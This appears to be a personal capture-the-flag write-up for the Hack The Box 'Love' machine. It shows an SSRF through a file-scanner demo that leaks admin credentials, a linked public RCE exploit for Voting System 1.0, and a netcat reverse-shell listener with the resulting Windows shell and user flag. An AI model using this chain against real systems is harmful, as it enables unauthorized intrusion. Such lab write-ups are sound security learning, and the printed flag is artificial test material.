# Enumeration-

 By adding the virtual host (`staging.love.htb`) in our hosts file we can access the web page on ssl-
 
 ```bash
 10.10.10.239    staging.love.htb 
 ```

![[Pasted image 20210702022201.png]]


# staging.love.htb-

![[Pasted image 20210702022523.png]]

We see a demo link bhy clicking on that we get redirected to a demo file scanner where we can enter URL-

![[Pasted image 20210702022649.png]]


# Ping-

We can enter our kali IP address and we see that indeed we  receive a connection-

![[Pasted image 20210702023007.png]]


# Exploit-

As we know there is also port 5000 open the box but we cant access it directly but what if we can access it internally using the file scanner-

![[Pasted image 20210702023510.png]]

And We got the Creds-

![[Pasted image 20210702023639.png]]

User-**admin**
Pass-**@LoveIsInTheAir!!!!**


# Login-

Using the above creds we were able to login-

![[Pasted image 20210702023944.png]]


![[Pasted image 20210702024043.png]]


# Exploit-

Just googling about voting system exploit we came up with-

[# Voting System 1.0 - Remote Code Execution (Unauthenticated)](https://www.exploit-db.com/exploits/49846)


![[Pasted image 20210702025852.png]]


![[Pasted image 20210702030233.png]]



# Reverse Shell-

Start your listener and click on Save-

```bash
root@napster:~/Documents/HTB/Love# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.15.4] from (UNKNOWN) [10.10.10.239] 59767
SOCKET: Shell has connected! PID: 6480
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\>whoami
love\phoebe
C:\Users\Phoebe>cd Des*

C:\Users\Phoebe\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 56DE-BA30

 Directory of C:\Users\Phoebe\Desktop

04/13/2021  03:20 AM    <DIR>          .
04/13/2021  03:20 AM    <DIR>          ..
07/02/2021  12:39 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4,061,003,776 bytes free

C:\Users\Phoebe\Desktop>type user.txt
1f33fc8555d76f4785833aac45abfb08
```




